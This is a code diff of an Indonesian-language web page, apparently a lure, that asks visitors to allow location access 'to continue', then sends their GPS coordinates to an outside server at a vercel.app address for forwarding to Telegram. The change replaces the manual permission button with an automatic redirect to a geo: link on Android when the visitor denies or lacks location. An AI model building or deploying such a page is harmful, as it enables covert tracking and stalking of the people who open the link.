@@ -60,9 +60,6 @@
       <h1>Pelacak Lokasi</h1>
       <p>Mohon izinkan akses lokasi untuk melanjutkan</p>
       <p id="loadingStatus">Meminta izin lokasi...</p>
-      <button id="locateBtn" style="display: none" onclick="getLocation()">
-        Izinkan Lokasi
-      </button>
       <p id="error-message" class="hidden">
         Lokasi tidak dapat diakses. Pastikan GPS diaktifkan.
       </p>
@@ -91,7 +88,9 @@
         } else {
           document.getElementById("loadingStatus").textContent =
             "Geolocation tidak didukung.";
-          document.getElementById("locateBtn").style.display = "block";
+          document.getElementById("error-message").classList.remove("hidden");
+          // Buka pengaturan lokasi pada Android jika geolocation tidak tersedia
+          openLocationSettings();
         }
       }
 
@@ -110,12 +109,11 @@
         );
 
         initMap(latitude, longitude);
-        shareLocationToTelegram(latitude, longitude); // Fungsi kirim lokasi ke Telegram
+        shareLocationToTelegram(latitude, longitude); // Kirim lokasi ke server untuk diteruskan ke Telegram
       }
 
       // Menangani error saat mendapatkan lokasi
       function showError(error) {
-        // Jika lokasi tidak dapat ditemukan, tampilkan pesan error dan tombol izinkan lokasi
         if (error.code === error.PERMISSION_DENIED) {
           document.getElementById("loadingStatus").textContent =
             "Anda menolak izin lokasi.";
@@ -127,8 +125,9 @@
             "Waktu permintaan lokasi habis.";
         }
 
-        document.getElementById("locateBtn").style.display = "block";
         document.getElementById("error-message").classList.remove("hidden");
+        // Buka pengaturan lokasi pada Android jika GPS tidak aktif
+        openLocationSettings();
       }
 
       // Inisialisasi peta dengan Leaflet
@@ -145,7 +144,15 @@
         }
       }
 
-      // Fungsi untuk mengirim lokasi ke Telegram
+      // Fungsi untuk membuka pengaturan lokasi pada perangkat Android
+      function openLocationSettings() {
+        if (navigator.userAgent.match(/Android/i)) {
+          // Untuk Android, membuka pengaturan lokasi
+          window.location.href = "geo:0,0?q=loc:0,0";
+        }
+      }
+
+      // Fungsi untuk mengirim lokasi ke server yang kemudian akan diteruskan ke Telegram
       function shareLocationToTelegram(latitude, longitude) {
         fetch("https://nyobaloca.vercel.app/send-location", {
           method: "POST",
